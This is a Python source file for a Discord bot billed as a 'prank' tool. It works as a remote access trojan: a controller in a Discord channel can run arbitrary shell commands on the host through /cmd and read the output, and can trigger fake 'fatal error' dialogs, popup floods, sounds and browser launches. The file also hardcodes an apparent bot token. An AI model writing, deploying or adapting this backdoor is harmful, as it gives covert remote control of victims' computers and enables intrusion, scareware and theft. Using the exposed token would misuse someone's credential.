import discord
from discord.ext import commands
import tkinter as tk
from tkinter import messagebox
import subprocess
import os
import platform
import webbrowser
import time
import random
import ctypes

TOKEN = 'MTM1MDE0MTY4OTEwODYyNzU4Nw.Go6W7_.xp2tiYWuFn2fK-mMLMRAL1Ya7LdlefsXZf3jDU'
CHANNEL_ID = 1349824367558787175
ALLOWED_USER_ID = 1178313288090669078

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)

def create_popup():
    root = tk.Tk()
    root.withdraw()
    messagebox.showwarning("Prank Popup", "You've been pranked!")
    root.destroy()

def fake_error():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Critical Error", "Your system has encountered a fatal error. Please restart your computer.")
    root.destroy()

def open_website(url):
    webbrowser.open(url)

def play_sound(sound_file):
    if platform.system() == "Windows":
        import winsound
        winsound.PlaySound(sound_file, winsound.SND_FILENAME)
    else:
        os.system(f"aplay {sound_file}")

def flip_screen():
    if platform.system() == "Windows":
        ctypes.windll.user32.SetProcessDPIAware()
        ctypes.windll.user32.EnumDisplaySettings(0, -1)
        ctypes.windll.user32.ChangeDisplaySettings(0, 0x00000002)
    else:
        return "This prank only works on Windows."

def random_popups(duration, delay):
    end_time = time.time() + duration
    while time.time() < end_time:
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Prank", "You've been pranked!")
        root.destroy()
        time.sleep(delay)

def execute_command(cmd):
    try:
        if cmd.startswith("cd "):
            new_dir = cmd[3:].strip()
            try:
                os.chdir(new_dir)
                return f"Changed directory to: {new_dir}"
            except Exception as e:
                return f"Failed to change directory: {str(e)}"
        elif cmd == "ls":
            if platform.system() == "Windows":
                result = subprocess.run("dir", shell=True, capture_output=True, text=True, cwd=os.getcwd())
            else:
                result = subprocess.run("ls", shell=True, capture_output=True, text=True, cwd=os.getcwd())
            if result.returncode == 0:
                return result.stdout
            else:
                return result.stderr
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=os.getcwd())
            if result.returncode == 0:
                return result.stdout
            else:
                return result.stderr
    except Exception as e:
        return str(e)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("Bot is online and ready!")
    else:
        print(f"Channel with ID {CHANNEL_ID} not found.")

@bot.command(name="commands")
async def help_cmd(ctx):
    help_message = """
**Available Commands:**
- `/popup`: Creates a prank popup on the host computer.
- `/cmd <command>`: Executes a command on the host computer.
- `/fake_error`: Displays a fake critical error message.
- `/open_website <url>`: Opens a website in the default browser.
- `/play_sound <sound_file>`: Plays a sound file.
- `/flip_screen`: Flips the screen orientation (Windows only).
- `/random_popups <duration> <delay>`: Creates random popups for a specified duration with a delay between each popup.
- `/help`: Displays this help message.
"""
    await ctx.send(help_message)

@bot.command(name="popup")
async def popup(ctx):
    if ctx.channel.id == CHANNEL_ID:
        await ctx.send("Creating a prank popup on the host computer...")
        create_popup()
    else:
        await ctx.send("This command can only be used in the designated channel.")

@bot.command(name="cmd")
async def cmd(ctx, *, command: str):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    await ctx.send(f"Executing command: `{command}`")
    output = execute_command(command)
    await ctx.send(f"Command output:\n```\n{output}\n```")

@bot.command(name="fake_error")
async def fake_error_cmd(ctx):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    await ctx.send("Creating a fake error message...")
    fake_error()

@bot.command(name="open_website")
async def open_website_cmd(ctx, url: str):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    await ctx.send(f"Opening website: {url}")
    open_website(url)

@bot.command(name="play_sound")
async def play_sound_cmd(ctx, sound_file: str):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    await ctx.send(f"Playing sound: {sound_file}")
    play_sound(sound_file)

@bot.command(name="flip_screen")
async def flip_screen_cmd(ctx):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    await ctx.send("Flipping screen...")
    output = flip_screen()
    if output:
        await ctx.send(output)

@bot.command(name="random_popups")
async def random_popups_cmd(ctx, duration: int, delay: int):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("You are not authorized to use this command.")
        return
    await ctx.send(f"Creating random popups for {duration} seconds with a delay of {delay} seconds...")
    random_popups(duration, delay)

bot.run(TOKEN)
